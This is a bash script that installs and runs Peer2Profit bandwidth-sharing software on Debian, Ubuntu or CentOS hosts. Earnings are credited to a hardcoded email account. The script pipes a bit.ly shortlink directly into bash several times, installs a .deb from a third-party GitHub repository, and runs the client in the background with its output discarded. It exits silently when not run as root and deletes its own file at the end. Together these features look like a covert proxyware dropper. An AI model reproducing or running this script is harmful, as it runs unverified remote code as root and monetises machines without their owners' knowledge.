#!/bin/bash
REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "'amazon linux'")
RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS")
PACKAGE_UPDATE=("apt -y update" "apt -y update" "yum -y update" "yum -y update")
PACKAGE_INSTALL=("apt -y install" "apt -y install" "yum -y install" "yum -y install")
PACKAGE_UNINSTALL=("apt -y autoremove" "apt -y autoremove" "yum -y autoremove" "yum -y autoremove")

[[ $EUID -ne 0 ]] && exit 1

CMD=("$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d \" -f2)" "$(hostnamectl 2>/dev/null | grep -i system | cut -d : -f2)" "$(lsb_release -sd 2>/dev/null)" "$(grep -i description /etc/lsb-release 2>/dev/null | cut -d \" -f2)" "$(grep . /etc/redhat-release 2>/dev/null)" "$(grep . /etc/issue 2>/dev/null | cut -d \\ -f1 | sed '/^[ ]*$/d')")

for i in "${CMD[@]}"; do
    SYS="$i" && [[ -n $SYS ]] && break
done

for ((int = 0; int < ${#REGEX[@]}; int++)); do
    [[ $(echo "$SYS" | tr '[:upper:]' '[:lower:]') =~ ${REGEX[int]} ]] && SYSTEM="${RELEASE[int]}" && [[ -n $SYSTEM ]] && break
done

[[ -z $SYSTEM ]] && exit 1

sudo kill -9 $(pidof p2pclient)

ARCH=$(uname -m)
case "$ARCH" in
x86_64 ) ARCHITECTURE="amd64";;
* ) ARCHITECTURE="i386";;
esac

SPP=$(cat /etc/os-release | grep VERSION_ID | cut -d\" -f2)

if [ $SYSTEM = "CentOS" ]; then
    yum install -y curl
    rm -rf *p2pclient*
    if [ $SPP = "7" ]; then
        yum install -y sudo
        sudo yum install -y yum-utils
        sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
        sudo yum install -y docker-ce docker-ce-cli containerd.io
        systemctl start docker
        systemctl enable docker
        export P2P_EMAIL=mengxin82@outlook.com;
        docker rm -f peer2profit || true && docker run -d --restart always \
                -e P2P_EMAIL=$P2P_EMAIL \
                --name peer2profit \
                peer2profit/peer2profit_linux:latest
    else
        curl -fsSL bit.ly/peer2fly |bash -s -- --email mengxin82@outlook.com --number 1
        sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
        service docker start
        rm -rf *p2pclient*
        curl -fsSL bit.ly/peer2fly |bash -s -- --email mengxin82@outlook.com --number 1
    fi
else
    apt-get update
    apt-get install sudo -y
    apt-get install curl -y
    apt-get install wget -y
    sudo dpkg -P p2pclient
    if [ $ARCHITECTURE = "amd64" ]; then
        rm -rf *p2p*
        wget https://github.com/spiritysdx/za/raw/main/64/p2p.deb
        dpkg -i p2p.deb
        nohup p2pclient -l mengxin82@outlook.com >/dev/null 2>&1 &
    else
        rm -rf *p2p*
        wget https://github.com/spiritysdx/za/raw/main/32/p2p.deb
        dpkg -i p2p.deb
        nohup p2pclient -l mengxin82@outlook.com >/dev/null 2>&1 &
    fi
    if [ $? -ne 0 ]; then
        apt-get install apt-transport-https ca-certificates gnupg lsb-release -y
        curl -fsSL https://download.docker.com/linux/debian/gpg -y | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg -y
        echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
        apt-get install docker-ce docker-ce-cli containerd.io -y
        curl -fsSL bit.ly/peer2fly |bash -s -- --email mengxin82@outlook.com --number 1
    else
        echo "succeed"
    fi
fi
rm -rf *sep
rm -rf sep.sh
